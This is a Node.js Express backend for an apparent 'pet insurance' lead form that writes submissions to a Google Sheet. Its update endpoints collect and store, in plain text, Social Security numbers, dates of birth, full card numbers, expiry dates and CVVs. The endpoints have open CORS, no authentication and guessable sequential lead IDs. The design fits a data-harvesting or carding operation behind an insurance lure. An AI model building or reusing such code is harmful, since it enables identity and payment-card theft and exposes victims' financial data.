require("dotenv").config();

const express = require("express");
const cors = require("cors");
const { google } = require("googleapis");

const app = express();

app.use(cors());
app.use(express.json());

const MASTER_TAB = "MasterData";
const TOTAL_COLUMNS = 25;

const getPakistanTime = () => {
  return new Date().toLocaleString("en-US", {
    timeZone: "Asia/Karachi",
    year: "numeric",
    month: "2-digit",
    day: "2-digit",
    hour: "2-digit",
    minute: "2-digit",
    second: "2-digit",
    hour12: true,
  });
};

function getGoogleAuth() {
  if (process.env.GOOGLE_SERVICE_ACCOUNT_BASE64) {
    const credentials = JSON.parse(
      Buffer.from(process.env.GOOGLE_SERVICE_ACCOUNT_BASE64, "base64").toString("utf8")
    );

    if (credentials.private_key) {
      credentials.private_key = credentials.private_key.replace(/\\n/g, "\n");
    }

    return new google.auth.GoogleAuth({
      credentials,
      scopes: ["https://www.googleapis.com/auth/spreadsheets"],
    });
  }

  return new google.auth.GoogleAuth({
    keyFile: "./google-sheet-key.json",
    scopes: ["https://www.googleapis.com/auth/spreadsheets"],
  });
}

async function getSheetsClient() {
  const auth = getGoogleAuth();
  return google.sheets({ version: "v4", auth });
}

async function getRows() {
  const sheets = await getSheetsClient();

  const response = await sheets.spreadsheets.values.get({
    spreadsheetId: process.env.SHEET_ID,
    range: `${MASTER_TAB}!A:Y`,
  });

  return response.data.values || [];
}

async function getSheetId() {
  const sheets = await getSheetsClient();

  const spreadsheet = await sheets.spreadsheets.get({
    spreadsheetId: process.env.SHEET_ID,
  });

  const sheet = spreadsheet.data.sheets.find(
    (s) => s.properties.title === MASTER_TAB
  );

  if (!sheet) {
    throw new Error("MasterData tab not found");
  }

  return sheet.properties.sheetId;
}

async function formatRow(rowNumber) {
  const sheets = await getSheetsClient();
  const sheetId = await getSheetId();

  await sheets.spreadsheets.batchUpdate({
    spreadsheetId: process.env.SHEET_ID,
    requestBody: {
      requests: [
        {
          repeatCell: {
            range: {
              sheetId,
              startRowIndex: rowNumber - 1,
              endRowIndex: rowNumber,
              startColumnIndex: 0,
              endColumnIndex: TOTAL_COLUMNS,
            },
            cell: {
              userEnteredFormat: {
                backgroundColor: { red: 1, green: 1, blue: 1 },
                textFormat: {
                  foregroundColor: { red: 0, green: 0, blue: 0 },
                  bold: false,
                },
              },
            },
            fields:
              "userEnteredFormat(backgroundColor,textFormat.foregroundColor,textFormat.bold)",
          },
        },
      ],
    },
  });
}

async function createLead(data) {
  if (!process.env.SHEET_ID) {
    throw new Error("SHEET_ID is missing in .env");
  }

  const sheets = await getSheetsClient();
  const rows = await getRows();
  const oldIds = rows.slice(1).filter((row) => row[1]);
  const uniqueId = `pet-${oldIds.length + 1}`;

  const values = [
    getPakistanTime(),
    uniqueId,
    data.petName || "",
    data.petSpecies || "",
    data.petSex || "",
    data.breed || "",
    data.age || "",
    data.zipCode || "",
    data.email || "",
    data.phone || "",
    "",
    "",
    "",
    "",
    "",
    "",
    "",
    "",
    "",
    "",
    "",
    "",
    "",
    "",
    "",
  ];

  const appendResponse = await sheets.spreadsheets.values.append({
    spreadsheetId: process.env.SHEET_ID,
    range: `${MASTER_TAB}!A1`,
    valueInputOption: "RAW",
    insertDataOption: "INSERT_ROWS",
    includeValuesInResponse: true,
    requestBody: {
      values: [values],
    },
  });

  const updatedRange = appendResponse.data.updates.updatedRange;
  const rowNumber = Number(updatedRange.match(/![A-Z]+(\d+):/)?.[1]);

  if (rowNumber) {
    await formatRow(rowNumber);
  }

  return uniqueId;
}

async function updateLead(uniqueId, updates) {
  if (!process.env.SHEET_ID) {
    throw new Error("SHEET_ID is missing in .env");
  }

  if (!uniqueId) {
    throw new Error("uniqueId is required");
  }

  const sheets = await getSheetsClient();
  const rows = await getRows();

  const rowIndex = rows.findIndex((row, index) => index > 0 && row[1] === uniqueId);

  if (rowIndex === -1) {
    throw new Error("Lead not found");
  }

  const rowNumber = rowIndex + 1;
  const currentRow = [...(rows[rowIndex] || [])];

  while (currentRow.length < TOTAL_COLUMNS) {
    currentRow.push("");
  }

  const columnMap = {
    petName: 2,
    petSpecies: 3,
    petSex: 4,
    breed: 5,
    age: 6,
    zipCode: 7,
    email: 8,
    phone: 9,
    planName: 10,
    amount: 11,
    firstName: 12,
    lastName: 13,
    address: 14,
    apartment: 15,
    city: 16,
    state: 17,
    dob: 18,
    ssn: 19,
    cardName: 20,
    cardNumber: 21,
    cardExpiry: 22,
    cardCVV: 23,
    billingZip: 24,
  };

  Object.keys(columnMap).forEach((key) => {
    if (updates[key] !== undefined) {
      currentRow[columnMap[key]] = updates[key] || "";
    }
  });

  await sheets.spreadsheets.values.update({
    spreadsheetId: process.env.SHEET_ID,
    range: `${MASTER_TAB}!A${rowNumber}:Y${rowNumber}`,
    valueInputOption: "RAW",
    requestBody: {
      values: [currentRow],
    },
  });

  await formatRow(rowNumber);
}

app.get("/", (req, res) => {
  res.send("Pet Insurance Backend Running");
});

app.post("/api/create-lead", async (req, res) => {
  try {
    const uniqueId = await createLead(req.body);
    res.json({ success: true, uniqueId });
  } catch (error) {
    console.log("CREATE LEAD ERROR:", error.message);
    res.status(500).json({ success: false, message: error.message });
  }
});

app.post("/api/update-lead", async (req, res) => {
  try {
    const { uniqueId, ...updates } = req.body;
    await updateLead(uniqueId, updates);
    res.json({ success: true, uniqueId });
  } catch (error) {
    console.log("UPDATE LEAD ERROR:", error.message);
    res.status(500).json({ success: false, message: error.message });
  }
});

app.post("/api/save-lead", async (req, res) => {
  try {
    const uniqueId = await createLead(req.body);
    await updateLead(uniqueId, req.body);
    res.json({ success: true, uniqueId });
  } catch (error) {
    console.log("SAVE LEAD ERROR:", error.message);
    res.status(500).json({ success: false, message: error.message });
  }
});

module.exports = app;

if (require.main === module) {
  const PORT = process.env.PORT || 5000;
  app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
  });
}